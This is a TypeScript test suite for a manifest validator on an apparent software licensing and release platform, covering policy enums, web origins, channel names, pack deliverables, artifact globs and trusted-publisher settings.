
describe("devices.registration policy", () => {
  const parse = (devices: unknown) =>
    parseManifest({
      product: JSON.stringify({ ...PRODUCT, devices }),
      schema: JSON.stringify(catalogWithSecretDelivery()),
    });

  it("carries each accepted policy through to the parsed manifest", () => {
    for (const policy of ["open", "requires-identity", "requires-license"]) {
      const res = parse({ registration: policy });
      expect(res.ok).toBe(true);
      if (!res.ok) return;
      expect(res.manifest.registration).toBe(policy);
    }
  });

  it("leaves registration undefined when undeclared", () => {
    // The default is DERIVED from the enabled services at the point of use (§2.3), so it is
    // deliberately not frozen at ingest.
    const res = parse(undefined);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.registration).toBeUndefined();
  });

  it("refuses an unrecognised policy instead of coercing it to a default", () => {
    // Silently defaulting would answer "requires-license" with "open" for the one manifest
    // that most meant it.
    for (const bad of ["Open", "requires-payment", "", 1, true, null]) {
      const res = parse({ registration: bad });
      expect(res.ok).toBe(false);
      if (res.ok) return;
      expect(res.errors.join("\n")).toContain(
        "devices.registration must be one of",
      );
    }
  });

  it("reports the invalid_registration_policy code", () => {
    const res = validateManifestDocuments({
      product: { ...PRODUCT, devices: { registration: "nope" } },
      schema: catalogWithSecretDelivery(),
    });
    expect(res.ok).toBe(false);
    expect(res.errors.map((e) => e.code)).toContain(
      "invalid_registration_policy",
    );
  });

  it("ignores a non-object devices block", () => {
    const res = parse("open");
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.registration).toBeUndefined();
  });
});

describe("release-block requirement survives the vocabulary change", () => {
  const validate = (modules: Record<string, unknown>) =>
    validateManifestDocuments({
      product: { ...PRODUCT, modules },
      schema: catalogWithSecretDelivery(),
    });

  it("still demands a release document for the legacy releases module", () => {
    expect(
      validate({ releases: { enabled: true } }).errors.map((e) => e.code),
    ).toContain("missing_release");
  });

  it("demands one for the new release slug as well", () => {
    expect(
      validate({ release: { enabled: true } }).errors.map((e) => e.code),
    ).toContain("missing_release");
  });
});

// ── Phase 2.0: the fingerprint/autoIssue enum gap is CLOSED, not coerced ──────────────────
//
// Every enum below used to be silently coerced at the normalize stage; the admin PATCH path
// already rejected the same values. These cases pin the manifest path to the same standard,
// plus the fail-closed normalizer (an unrecognized autoIssue.mode must disable the policy,
// never fall open to "anonymous" — the mode that opens the keyless enroll endpoint).

function policyCodes(extra: Record<string, unknown>): string[] {
  return validateManifestDocuments({
    product: { ...PRODUCT, ...extra },
    schema: catalogWithSecretDelivery(),
  }).errors.map((e) => e.code);
}

describe("fingerprint policy validation", () => {
  it("rejects a non-object fingerprint block", () => {
    expect(policyCodes({ fingerprint: "on" })).toContain("invalid_fingerprint");
  });

  it("rejects a non-boolean enabled", () => {
    expect(policyCodes({ fingerprint: { enabled: "yes" } })).toContain(
      "invalid_fingerprint_enabled",
    );
  });

  it("rejects an unrecognized defaultMode instead of coercing to normal", () => {
    expect(policyCodes({ fingerprint: { defaultMode: "stricht" } })).toContain(
      "invalid_fingerprint_mode",
    );
  });

  it("accepts every real mode", () => {
    for (const mode of ["off", "lenient", "normal", "strict"]) {
      expect(
        policyCodes({ fingerprint: { enabled: true, defaultMode: mode } }),
        mode,
      ).toEqual([]);
    }
  });

  it("rejects an unrecognized tier policyFingerprint", () => {
    expect(
      policyCodes({
        tiers: [{ id: "pro", policyFingerprint: "paranoid" }],
      }),
    ).toContain("invalid_tier_fingerprint_mode");
  });

  it("accepts a null tier policyFingerprint (inherit)", () => {
    expect(
      policyCodes({ tiers: [{ id: "pro", policyFingerprint: null }] }),
    ).toEqual([]);
  });
});

describe("autoIssue policy validation", () => {
  it("rejects a non-object block and a non-boolean enabled", () => {
    expect(policyCodes({ autoIssue: true })).toContain("invalid_auto_issue");
    expect(
      policyCodes({ autoIssue: { enabled: "yes", tierId: "free" } }),
    ).toContain("invalid_auto_issue");
  });

  it("rejects an unrecognized mode instead of falling open to anonymous", () => {
    expect(
      policyCodes({
        tiers: [{ id: "free" }],
        autoIssue: { enabled: true, tierId: "free", mode: "sponsored" },
      }),
    ).toContain("invalid_auto_issue_mode");
  });

  it("requires a tierId when enabled", () => {
    expect(policyCodes({ autoIssue: { enabled: true } })).toContain(
      "missing_auto_issue_tier",
    );
  });

  it("cross-checks tierId against the declared tiers (mirrors unknown_profile_ref)", () => {
    expect(
      policyCodes({
        tiers: [{ id: "free" }],
        autoIssue: { enabled: true, tierId: "ghost" },
      }),
    ).toContain("unknown_auto_issue_tier_ref");
    // Even a DISABLED policy naming a phantom tier is an authoring mistake.
    expect(
      policyCodes({
        tiers: [{ id: "free" }],
        autoIssue: { enabled: false, tierId: "ghost" },
      }),
    ).toContain("unknown_auto_issue_tier_ref");
  });

  it("bounds rateLimitPerHour to non-negative integers", () => {
    for (const bad of [-1, 1.5, "10"]) {
      expect(
        policyCodes({
          tiers: [{ id: "free" }],
          autoIssue: { enabled: true, tierId: "free", rateLimitPerHour: bad },
        }),
        String(bad),
      ).toContain("invalid_rate_limit");
    }
  });

  it("accepts a coherent policy", () => {
    expect(
      policyCodes({
        tiers: [{ id: "free" }],
        autoIssue: {
          enabled: true,
          tierId: "free",
          mode: "both",
          rateLimitPerHour: 10,
        },
      }),
    ).toEqual([]);
  });

  it("normalizeAutoIssue fails CLOSED on an unrecognized mode", () => {
    // Direct assertion on the normalizer: even for callers that bypass validation, a garbage
    // mode disables the policy rather than resolving to "anonymous".
    expect(
      normalizeAutoIssue({ enabled: true, tierId: "free", mode: "sponsored" }),
    ).toMatchObject({ enabled: false });
    // An OMITTED mode is a default, not a coercion — the policy stays enabled.
    expect(normalizeAutoIssue({ enabled: true, tierId: "free" })).toMatchObject(
      { enabled: true, mode: "anonymous" },
    );
  });
});

describe("reserved product slugs", () => {
  it("refuses slugs the platform router owns", () => {
    for (const slug of ["docs", "manage", "api", "well-known"]) {
      expect(
        validateManifestDocuments({
          product: { slug, name: "X" },
          schema: catalogWithSecretDelivery(),
        }).errors.map((e) => e.code),
        slug,
      ).toContain("reserved_slug");
    }
  });

  it("does not over-match near misses", () => {
    expect(
      validateManifestDocuments({
        product: { slug: "docsy", name: "X" },
        schema: catalogWithSecretDelivery(),
      }).errors.map((e) => e.code),
    ).toEqual([]);
  });
});

describe("ingest document presence (validateIngestDocuments)", () => {
  const configOff = {
    ...PRODUCT,
    modules: { license: { enabled: true }, release: { enabled: true } },
  };

  it("requires the schema even when Config is off, where the author-side check does not", () => {
    const docs = { product: configOff, release: release() };
    expect(
      validateManifestDocuments(docs).errors.map((e) => e.code),
    ).not.toContain("missing_schema");

    const res = validateIngestDocuments(docs);
    expect(res.ok).toBe(false);
    expect(res.errors.filter((e) => e.code === "missing_schema")).toEqual([
      {
        file: "schema",
        path: "/",
        code: "missing_schema",
        message:
          ".pkey/schema is required at ingest even when Config is off; an empty catalog is schemaVersion: 1 with no entries.",
      },
    ]);
  });

  it("reports missing_schema once when Config is on", () => {
    const res = validateIngestDocuments({ product: PRODUCT });
    expect(res.errors.filter((e) => e.code === "missing_schema")).toHaveLength(
      1,
    );
  });

  it("accepts an empty catalog with Config off", () => {
    const res = validateIngestDocuments({
      product: configOff,
      schema: { schemaVersion: 1, catalog: [] },
      release: release(),
    });
    expect(res.errors).toEqual([]);
    expect(res.ok).toBe(true);
  });

  it("does not shape-validate a Config-off catalog (link/resync behaviour is unchanged)", () => {
    const schema = {
      schemaVersion: 1,
      entries: [
        {
          key: "api.token",
          kind: "config",
          category: "General",
          label: "API token",
          schema: { type: "string" },
        },
      ],
    };
    const res = validateIngestDocuments({
      product: configOff,
      schema,
      release: release(),
    });
    expect(res.errors.map((e) => e.code)).not.toContain(
      "invalid_catalog_shape",
    );
    expect(
      validateIngestDocuments({ product: PRODUCT, schema }).errors.map(
        (e) => e.code,
      ),
    ).toContain("invalid_catalog_shape");
  });

  it("parseManifest returns the same message for a missing schema file", () => {
    const res = parseManifest({
      product: JSON.stringify(configOff),
      release: JSON.stringify(release()),
    });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.errors).toEqual([
      "schema: .pkey/schema is required at ingest even when Config is off; an empty catalog is schemaVersion: 1 with no entries.",
    ]);
  });

  it("reports a missing product, and a missing schema alongside it", () => {
    const only = parseManifest({
      schema: JSON.stringify({ schemaVersion: 1 }),
    });
    expect(only.ok).toBe(false);
    if (only.ok) return;
    expect(only.errors).toEqual([
      "product: .pkey/product is required at ingest.",
    ]);

    const both = parseManifest({ release: JSON.stringify(release()) });
    expect(both.ok).toBe(false);
    if (both.ok) return;
    expect(both.errors.map((e) => e.split(":")[0])).toEqual([
      "product",
      "schema",
    ]);
  });
});

describe("tier keys the scaffold used to write (tier_ignored_field)", () => {
  const tiered = (tier: Record<string, unknown>) => ({
    product: {
      ...PRODUCT,
      licensing: { tiers: [{ id: "standard", ...tier }] },
    },
    schema: { schemaVersion: 1, catalog: [] },
  });

  it("normalises a policyDeviceLimit tier with no expiry to a non-expiring licence", () => {
    const res = parseManifest({
      product: JSON.stringify(tiered({ policyDeviceLimit: 5 }).product),
      schema: JSON.stringify({ schemaVersion: 1, catalog: [] }),
    });
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.tiers[0]).toMatchObject({
      policyDeviceLimit: 5,
      policyExpiryDays: null,
    });
  });

  it("warns, without erroring, for deviceLimit and maxOfflineDays on a tier", () => {
    const res = validateManifestDocuments(
      tiered({ deviceLimit: 5, maxOfflineDays: 14 }),
    );
    expect(res.ok).toBe(true);
    expect(res.errors).toEqual([]);
    expect(res.warnings.filter((w) => w.code === "tier_ignored_field")).toEqual(
      [
        expect.objectContaining({
          path: "/licensing/tiers/0/deviceLimit",
          message: expect.stringContaining("policyDeviceLimit"),
        }),
        expect.objectContaining({
          path: "/licensing/tiers/0/maxOfflineDays",
          message: expect.stringContaining("policyExpiryDays"),
        }),
      ],
    );
  });

  it("words the maxOfflineDays warning by whether it actually wins", () => {
    const msg = (tier: Record<string, unknown>) =>
      validateManifestDocuments(tiered(tier)).warnings.find(
        (w) => w.path === "/licensing/tiers/0/maxOfflineDays",
      )?.message;
    expect(msg({ maxOfflineDays: 14 })).toContain("sets the licence expiry");
    expect(msg({ maxOfflineDays: 14, policyExpiryDays: 30 })).not.toContain(
      "sets the licence expiry",
    );
    expect(msg({ maxOfflineDays: 14, expiryDays: 30 })).toContain("wins");
    expect(msg({ maxOfflineDays: "14" })).toContain("not a number");
  });

  it("stays silent for the keys the normaliser reads", () => {
    const res = validateManifestDocuments(
      tiered({ policyDeviceLimit: 5, policyExpiryDays: 30 }),
    );
    expect(res.warnings.map((w) => w.code)).not.toContain("tier_ignored_field");
  });
});

describe("channel names (P0-04, WIRE-CONTRACT-V3 §5.1)", () => {
  const docs = (opts: {
    tierChannels?: string[];
    manual?: string[];
    artifactChannels?: string[];
  }) => ({
    product: {
      ...PRODUCT,
      licensing: {
        tiers: [
          {
            id: "standard",
            ...(opts.tierChannels ? { channels: opts.tierChannels } : {}),
          },
        ],
      },
    },
    schema: { schemaVersion: 1, catalog: [] },
    release: {
      release: {
        ghOwner: "acme",
        ghRepo: "desktop",
        binaryName: "acme",
        ...(opts.manual
          ? {
              manualChannels: opts.manual.map((name) => ({
                name,
                regex: "v.*-x",
              })),
            }
          : {}),
        ...(opts.artifactChannels
          ? { artifactPolicy: { channels: opts.artifactChannels } }
          : {}),
      },
    },
  });
  const codes = (res: ReturnType<typeof validateManifestDocuments>) =>
    res.warnings.map((w) => `${w.code} ${w.path}`);

  it("warns on a non-canonical manual name and artifactPolicy channel", () => {
    const res = validateManifestDocuments(
      docs({ manual: ["Nightly"], artifactChannels: ["Beta.2"] }),
    );
    expect(res.ok).toBe(true);
    expect(codes(res)).toEqual([
      "noncanonical_channel_name /release/artifactPolicy/channels/0",
      "noncanonical_channel_name /release/manualChannels/0/name",
    ]);
  });

  it("warns on manual names a built-in takes over, but not on staging", () => {
    const res = validateManifestDocuments(
      docs({ manual: ["pr42", "dev", "staging", "nightly"] }),
    );
    expect(res.ok).toBe(true);
    expect(codes(res)).toEqual([
      "reserved_channel_name /release/manualChannels/0/name",
      "reserved_channel_name /release/manualChannels/1/name",
    ]);
  });

  it("accepts the valid grants staging, dev and pr; warns on a hyphenless pr grant", () => {
    expect(
      codes(
        validateManifestDocuments(
          docs({ tierChannels: ["stable", "beta", "staging", "dev", "pr"] }),
        ),
      ),
    ).toEqual([]);
    expect(
      codes(
        validateManifestDocuments(
          docs({ tierChannels: ["pr-42", "pr42", "Beta"] }),
        ),
      ),
    ).toEqual([
      "noncanonical_channel_name /licensing/tiers/0/channels/1",
      "noncanonical_channel_name /licensing/tiers/0/channels/2",
    ]);
  });

  it("isReservedChannelName reads the protocol constants", () => {
    for (const name of [
      "stable",
      "latest",
      "beta",
      "pr",
      "dev",
      "pr-42",
      "pr42",
    ])
      expect(isReservedChannelName(name), name).toBe(true);
    for (const name of ["staging", "nightly", "prod", "pr-", "Beta"])
      expect(isReservedChannelName(name), name).toBe(false);
  });
});

describe("web.origins (P0-05)", () => {
  const parse = (web: unknown) =>
    parseManifest({
      product: JSON.stringify({ ...PRODUCT, web }),
      schema: JSON.stringify(catalogWithSecretDelivery()),
    });
  const codes = (web: unknown) =>
    validateManifestDocuments({
      product: { ...PRODUCT, web },
      schema: catalogWithSecretDelivery(),
    }).errors.map((e) => e.code);

  it("accepts exact origins, including an explicit non-default port and loopback http", () => {
    for (const origin of [
      "https://diceroll.gg",
      "https://play.diceroll.gg:8443",
      "https://xn--bcher-kva.example",
      "http://localhost",
      "http://localhost:8060",
      "http://127.0.0.1:8060",
    ]) {
      expect(webOriginProblem(origin), origin).toBeNull();
      expect(isWebOrigin(origin), origin).toBe(true);
    }
  });

  it("refuses anything a browser would never send as an Origin", () => {
    for (const bad of [
      "",
      "diceroll.gg",
      "https://diceroll.gg/",
      "https://diceroll.gg/play",
      "https://diceroll.gg?x=1",
      "https://diceroll.gg#top",
      "https://user:pw@diceroll.gg",
      "https://*.diceroll.gg",
      "*",
      "null",
      "https://DICEROLL.gg",
      "HTTPS://diceroll.gg",
      "https://diceroll.gg:443",
      "https://diceroll.gg:0443",
      "https://diceroll.gg:99999",
      "http://diceroll.gg",
      "http://127.0.0.2",
      "http://[::1]:8060",
      "http://localhost:80",
      "ws://localhost:8060",
      "https://diceroll.gg\n",
      `https://${"a".repeat(300)}.example`,
      42,
      null,
    ]) {
      expect(webOriginProblem(bad), String(bad)).not.toBeNull();
    }
  });

  it("carries the list through parseManifest, and defaults to empty", () => {
    const res = parse({
      origins: ["https://diceroll.gg", "http://localhost:8060"],
    });
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.webOrigins).toEqual([
      "https://diceroll.gg",
      "http://localhost:8060",
    ]);

    const none = parse(undefined);
    expect(none.ok).toBe(true);
    if (!none.ok) return;
    expect(none.manifest.webOrigins).toEqual([]);
  });

  it("refuses rather than coerces: one bad entry fails the whole manifest", () => {
    const res = parse({
      origins: ["https://diceroll.gg", "https://Diceroll.gg"],
    });
    expect(res.ok).toBe(false);
    expect(codes({ origins: ["https://diceroll.gg/"] })).toEqual([
      "invalid_web_origin",
    ]);
  });

  it("reports the block shape and the cap as invalid_web_origins", () => {
    expect(codes("https://diceroll.gg")).toEqual(["invalid_web_origins"]);
    expect(codes({ origins: "https://diceroll.gg" })).toEqual([
      "invalid_web_origins",
    ]);
    const many = Array.from(
      { length: MAX_WEB_ORIGINS + 1 },
      (_, i) => `https://a${i}.example`,
    );
    expect(codes({ origins: many })).toEqual(["invalid_web_origins"]);
    expect(codes({ origins: many.slice(0, MAX_WEB_ORIGINS) })).toEqual([]);
  });

  it("refuses a duplicate entry", () => {
    expect(
      codes({ origins: ["https://diceroll.gg", "https://diceroll.gg"] }),
    ).toEqual(["invalid_web_origin"]);
  });
});

describe("release model vocabulary (P2-03)", () => {
  it("names the README §3.1 vocabularies verbatim", () => {
    expect(RELEASE_PLATFORMS).toEqual([
      "macos",
      "ios",
      "android",
      "windows",
      "linux",
      "web",
    ]);
    expect(RELEASE_ARCHES).toEqual([
      "arm64",
      "x86_64",
      "universal",
      "armv7",
      "wasm32",
      "any",
    ]);
    expect(ARTIFACT_ROLES).toEqual([
      "payload",
      "files-index",
      "chunk-index",
      "chunk-bundle",
      "delta",
      "signature",
      "checksum",
    ]);
    expect(DELIVERABLE_KINDS).toEqual(["app", "pack"]);
  });

  it.each([APP_DELIVERABLE_ID, "diceroll.core3d", "l10n-de", "a.b-c.d0"])(
    "accepts the deliverable id %s",
    (id) => expect(isDeliverableId(id)).toBe(true),
  );

  it.each([
    "",
    "App",
    "0app",
    "-app",
    "app.",
    ".app",
    "app..pack",
    "app_pack",
    "app pack",
    "a".repeat(MAX_DELIVERABLE_ID_LENGTH + 1),
    42,
    null,
  ])("rejects the deliverable id %j", (id) =>
    expect(isDeliverableId(id)).toBe(false),
  );
});

describe("deliverables and the artifact map (P2-04)", () => {
  const parseWith = (fields: Record<string, unknown>) =>
    parseManifest({
      product: JSON.stringify(PRODUCT),
      schema: JSON.stringify(catalogWithSecretDelivery()),
      release: JSON.stringify({
        release: { ...(release().release as object), ...fields },
      }),
    });

  it("a document without deliverables keeps the implicit app (legacy sniffing)", () => {
    const res = parseWith({});
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.release?.app).toBeNull();
  });

  it("normalises the app declaration with its defaults", () => {
    const res = parseWith({
      deliverables: {
        app: {
          kind: "app",
          channels: { beta: { includes: ["stable"] } },
          artifacts: [
            {
              id: "macos",
              platform: "macos",
              arch: "universal",
              format: "dmg",
              match: "Acme-*.dmg",
            },
          ],
        },
        "acme.l10n": { kind: "pack", type: "files.tree" },
      },
    });
    expect(res.ok).toBe(false);
    const withContent = parseWith({
      deliverables: {
        app: {
          kind: "app",
          content: { contentApi: 2 },
          channels: { beta: { includes: ["stable"] } },
          artifacts: [
            {
              id: "macos",
              platform: "macos",
              arch: "universal",
              format: "dmg",
              match: "Acme-*.dmg",
            },
          ],
        },
        "acme.l10n": { kind: "pack", type: "files.tree" },
      },
    });
    expect(withContent.ok).toBe(true);
    if (!withContent.ok) return;
    expect(withContent.manifest.release?.app).toEqual({
      kind: "app",
      versioning: { scheme: "semver", buildNumber: null },
      channels: { beta: { includes: ["stable"] } },
      artifacts: [
        {
          id: "macos",
          platform: "macos",
          arch: "universal",
          format: "dmg",
          role: "payload",
          match: "Acme-*.dmg",
        },
      ],
      content: { contentApi: 2 },
    });
  });

  it("persists either spelling of the tag filters into the same fields", () => {
    const nested = parseWith({
      deliverables: {
        app: {
          kind: "app",
          versioning: {
            stableTagPattern: "v\\d+\\.\\d+\\.\\d+",
            ignoreTags: ["packs"],
          },
        },
      },
    });
    const legacy = parseWith({
      stableTagPattern: "v\\d+\\.\\d+\\.\\d+",
      ignoreTags: ["packs"],
      deliverables: { app: { kind: "app" } },
    });
    for (const res of [nested, legacy]) {
      expect(res.ok).toBe(true);
      if (!res.ok) return;
      expect(res.manifest.release?.stableTagPattern).toBe(
        "v\\d+\\.\\d+\\.\\d+",
      );
      expect(res.manifest.release?.ignoreTags).toEqual(["packs"]);
    }
  });

  it("refuses both spellings at once", () => {
    const res = parseWith({
      stableTagPattern: "v\\d+\\.\\d+\\.\\d+",
      deliverables: {
        app: { kind: "app", versioning: { ignoreTags: ["packs"] } },
      },
    });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.errors.join("\n")).toContain("keep one spelling");
  });

  it("normalises the v3 pack types: formatVersion and activation defaults (P4-16)", () => {
    const ok = parseWith({
      deliverables: {
        app: { kind: "app", content: { contentApi: 1 } },
        "acme.events": { kind: "pack", type: "data.json", formatVersion: 4 },
        "acme.strings": {
          kind: "pack",
          type: "l10n.table",
          variants: { locale: ["fr", "pt-BR"] },
        },
        "acme.model": { kind: "pack", type: "ml.model" },
        "acme.banks": {
          kind: "pack",
          type: "audio.bank",
          handler: { activation: "restart" },
        },
        "acme.mods": {
          kind: "pack",
          type: "godot.zip",
          handler: { prefixes: ["res://mods/"] },
          requires: { engine: "godot-4.7" },
        },
        "acme.dialogue": {
          kind: "pack",
          type: "custom.dialogue",
          formatVersion: 2,
        },
      },
    });
    expect(ok.ok).toBe(true);
    if (!ok.ok) return;
    const got = Object.fromEntries(
      ok.manifest.release!.packDeliverables.map((p) => [
        p.id,
        [p.type, p.formatVersion, p.handler.activation],
      ]),
    );
    expect(got).toEqual({
      "acme.banks": ["audio.bank", 1, "restart"],
      "acme.dialogue": ["custom.dialogue", 2, "hot"],
      "acme.events": ["data.json", 4, "hot"],
      "acme.model": ["ml.model", 1, "hot"],
      "acme.mods": ["godot.zip", 1, "restart"],
      "acme.strings": ["l10n.table", 1, "hot"],
    });
  });

  it("a pack deliverable is validated and normalised with its v1 defaults (P4-02)", () => {
    const docs = (deliverables: Record<string, unknown>) => ({
      product: { ...PRODUCT, modules: { releases: true } },
      schema: catalogWithSecretDelivery(),
      release: {
        release: { ...(release().release as object), deliverables },
      },
    });
    // A bare pack: no type, and no app with content.
    const bare = validateManifestDocuments(
      docs({ "acme.ui": { kind: "pack" } }),
    );
    expect(bare.errors.map((e) => e.code).sort()).toEqual([
      "invalid_app_content",
      "invalid_pack_type",
    ]);
    expect(bare.warnings).toEqual([]);
    const ok = parseWith({
      deliverables: {
        app: {
          kind: "app",
          content: {
            contentApi: 1,
            attachable: ["res://scripts/die.gd", "uid://dw1"],
          },
        },
        "acme.ui": {
          kind: "pack",
          type: "godot.pck",
          handler: { prefixes: ["res://ui/"] },
          requires: { engine: "godot-4.7" },
          // P4-20: a policy without `from` reads the default file.
          provides: { required: true },
        },
        "acme.l10n": {
          kind: "pack",
          type: "files.tree",
          variants: { locale: ["fr", "en"] },
          patch: { deltaBases: 2 },
        },
      },
    });
    expect(ok.ok).toBe(true);
    if (!ok.ok) return;
    // P4-28: the attachable list survives normalisation (the publish lint reads it).
    expect(ok.manifest.release?.app?.content).toEqual({
      contentApi: 1,
      attachable: ["res://scripts/die.gd", "uid://dw1"],
    });
    expect(ok.manifest.release?.packDeliverables).toEqual([
      {
        kind: "pack",
        id: "acme.l10n",
        type: "files.tree",
        formatVersion: 1,
        binding: "pinned",
        baseline: "none",
        required: false,
        delivery: "on-demand",
        contentPolicy: { dataOnly: true },
        handler: { activation: "hot" },
        variants: { locale: ["fr", "en"] },
        requires: {},
        conflicts: [],
        channels: [],
        entitlement: null,
        patch: { strategies: ["delta", "file", "chunk"], deltaBases: 2 },
        versioning: { scheme: "semver" },
        provides: null,
      },
      {
        kind: "pack",
        id: "acme.ui",
        type: "godot.pck",
        formatVersion: 1,
        binding: "pinned",
        baseline: "none",
        required: false,
        delivery: "on-demand",
        contentPolicy: { dataOnly: true },
        handler: { activation: "restart", prefixes: ["res://ui/"] },
        variants: {},
        requires: { engine: "godot-4.7" },
        conflicts: [],
        channels: [],
        entitlement: null,
        patch: { strategies: ["delta", "file", "chunk"], deltaBases: 1 },
        versioning: { scheme: "semver" },
        provides: { required: true, from: ".pkey/provides.json" },
      },
    ]);
    // The persisted def_json reads back to the same declaration.
    const [l10n] = ok.manifest.release!.packDeliverables;
    expect(parseManifestPackDeliverable(JSON.stringify(l10n))).toEqual(l10n);
    expect(parseManifestPackDeliverable('{"kind":"pack","id":"app"}')).toBe(
      null,
    );
    expect(packVariantKeys(l10n!)).toEqual(["locale=en", "locale=fr"]);
    expect(packVariantKeys({ variants: {} })).toEqual([""]);
    expect(
      packVariantKeys({
        variants: { texture: ["s3tc", "astc"], locale: ["en"] },
      }),
    ).toEqual(["locale=en;texture=astc", "locale=en;texture=s3tc"]);
  });

  it("includes may name a manual channel, and a cycle is refused", () => {
    const manual = [{ name: "nightly", regex: "v.*-nightly" }];
    const ok = parseWith({
      manualChannels: manual,
      deliverables: {
        app: { kind: "app", channels: { beta: { includes: ["nightly"] } } },
      },
    });
    expect(ok.ok).toBe(true);
    const self = parseWith({
      deliverables: {
        app: { kind: "app", channels: { beta: { includes: ["beta"] } } },
      },
    });
    expect(self.ok).toBe(false);
  });

  it("includes names are canonical: a tolerated manual name or an alias is refused, never stored", () => {
    for (const name of ["Nightly.2", "staging"]) {
      const res = parseWith({
        manualChannels: [{ name, regex: "v.*-x" }],
        deliverables: {
          app: { kind: "app", channels: { beta: { includes: [name] } } },
        },
      });
      expect(res.ok).toBe(false);
      if (res.ok) return;
      expect(res.errors.join("\n")).toContain(
        "/release/deliverables/app/channels/beta/includes/0: includes names must be canonical",
      );
    }
    // A stored declaration from before the rule loses the name rather than serving it.
    expect(
      parseManifestAppDeliverable(
        JSON.stringify({
          kind: "app",
          channels: { beta: { includes: ["stable", "Nightly.2", "staging"] } },
        }),
      )?.channels,
    ).toEqual({ beta: { includes: ["stable"] } });
  });
});

describe("matchesArtifactGlob", () => {
  it("anchors, is case-sensitive, and treats every other character literally", () => {
    const g = "Diceroll-*-macos.dmg";
    expect(matchesArtifactGlob(g, "Diceroll-1.2.3-macos.dmg")).toBe(true);
    expect(matchesArtifactGlob(g, "Diceroll--macos.dmg")).toBe(true);
    expect(matchesArtifactGlob(g, "diceroll-1.2.3-macos.dmg")).toBe(false);
    expect(matchesArtifactGlob(g, "Diceroll-1.2.3-macos.dmg.sig")).toBe(false);
    expect(matchesArtifactGlob(g, "xDiceroll-1.2.3-macos.dmg")).toBe(false);
    // `.` is not a regex wildcard, and regex metacharacters are plain text.
    expect(matchesArtifactGlob("a.zip", "abzip")).toBe(false);
    expect(matchesArtifactGlob("a(b)+[c].zip", "a(b)+[c].zip")).toBe(true);
  });

  it("? is exactly one character (one code point)", () => {
    expect(matchesArtifactGlob("v?.zip", "v1.zip")).toBe(true);
    expect(matchesArtifactGlob("v?.zip", "v.zip")).toBe(false);
    expect(matchesArtifactGlob("v?.zip", "v12.zip")).toBe(false);
    expect(matchesArtifactGlob("v?.zip", "v\u{1F680}.zip")).toBe(true);
  });

  it("stays linear on a pathological glob", () => {
    const glob = `${"*a".repeat(60)}b`;
    const name = "a".repeat(255);
    const t0 = performance.now();
    expect(matchesArtifactGlob(glob, name)).toBe(false);
    expect(performance.now() - t0).toBeLessThan(50);
  });

  it("validates a glob's shape", () => {
    expect(isArtifactMatch("*.dmg")).toBe(true);
    expect(isArtifactMatch("")).toBe(false);
    expect(isArtifactMatch("a\nb")).toBe(false);
    expect(isArtifactMatch("x".repeat(129))).toBe(false);
  });
});

describe("publishing.trustedPublisher (P2-02)", () => {
  const parseWith = (publishing: unknown) =>
    parseManifest({
      product: JSON.stringify(PRODUCT),
      schema: JSON.stringify(catalogWithSecretDelivery()),
      release: JSON.stringify({
        release: { ...(release().release as object), publishing },
      }),
    });

  it("is null when undeclared", () => {
    const res = parseManifest({
      product: JSON.stringify(PRODUCT),
      schema: JSON.stringify(catalogWithSecretDelivery()),
      release: JSON.stringify(release()),
    });
    expect(res.ok && res.manifest.release?.trustedPublisher).toBeNull();
  });

  it("normalizes the workflow and defaults the environment to release", () => {
    const res = parseWith({
      trustedPublisher: { workflow: ".github/workflows/release.yml" },
    });
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.release?.trustedPublisher).toEqual({
      workflow: ".github/workflows/release.yml",
      environment: "release",
    });
  });

  it("refuses a workflow outside .github/workflows and a malformed environment", () => {
    for (const [publishing, code] of [
      [
        { trustedPublisher: { workflow: "release.yml" } },
        "trustedPublisher/workflow",
      ],
      [{ trustedPublisher: "x" }, "/publishing/trustedPublisher:"],
      ["x", "/publishing/trustedPublisher:"],
      [
        {
          trustedPublisher: {
            workflow: ".github/workflows/r.yml",
            environment: "a/b",
          },
        },
        "trustedPublisher/environment",
      ],
    ] as const) {
      const res = parseWith(publishing);
      expect(res.ok, JSON.stringify(publishing)).toBe(false);
      if (!res.ok) expect(res.errors.join("\n")).toContain(code);
    }
  });

  it("has no field for the repository ids or the platform-fixed checks", () => {
    // Unknown keys are tolerated, but nothing reads them: a repo cannot loosen its own policy.
    const res = parseWith({
      trustedPublisher: {
        workflow: ".github/workflows/release.yml",
        repositoryId: 1,
        refProtected: false,
        runner: "self-hosted",
      },
    });
    expect(res.ok && res.manifest.release?.trustedPublisher).toEqual({
      workflow: ".github/workflows/release.yml",
      environment: "release",
    });
  });
});

describe("providesListProblem (P4-20)", () => {
  it("accepts a list of distinct content ids and names what is wrong otherwise", () => {
    expect(providesListProblem([])).toBeNull();
    expect(providesListProblem(["foe.goblin", "res://a/b.tres"])).toBeNull();
    expect(
      providesListProblem(
        Array.from({ length: MAX_PROVIDES }, (_, i) => `id.${i}`),
      ),
    ).toBeNull();
    expect(providesListProblem({ ids: [] })).toMatch(/not an array/);
    expect(
      providesListProblem(
        Array.from({ length: MAX_PROVIDES + 1 }, (_, i) => `id.${i}`),
      ),
    ).toMatch(/at most 4096/);
    expect(providesListProblem(["a", "a"])).toMatch(/lists a twice/);
    for (const bad of ["", "foe goblin", "x".repeat(129), "é", 7])
      expect(providesListProblem([bad])).toMatch(/not a content id/);
    expect(CONTENT_ID_PATTERN.test("x".repeat(128))).toBe(true);
  });
});
